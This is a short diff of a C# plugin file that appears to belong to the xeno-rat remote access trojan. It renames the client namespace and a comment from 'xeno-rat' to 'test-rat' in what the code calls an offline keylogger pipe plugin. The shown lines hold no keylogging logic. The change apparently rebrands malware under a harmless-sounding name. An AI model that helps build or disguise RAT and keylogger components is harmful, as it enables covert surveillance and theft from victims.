@@ -9,7 +9,7 @@ using System.Text;
 using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
-using xeno_rat_client;
+using test_rat_client;
 
 
 namespace Plugin
@@ -25,7 +25,7 @@ namespace Plugin
         string pipename = "OfflineKeyloggerPipe";
         NamedPipeClientStream client;
         Node node;
-        public async Task Run(Node node)// get server side intergation (I mean like xeno-rat gui) into this too (of course). Oh and last but not least, PROPER ERROR HANDLING, this is a mess waiting to happen!
+        public async Task Run(Node node)// get server side intergation (I mean like test-rat gui) into this too (of course). Oh and last but not least, PROPER ERROR HANDLING, this is a mess waiting to happen!
         {
             await node.SendAsync(new byte[] { 3 });
             this.node = node;
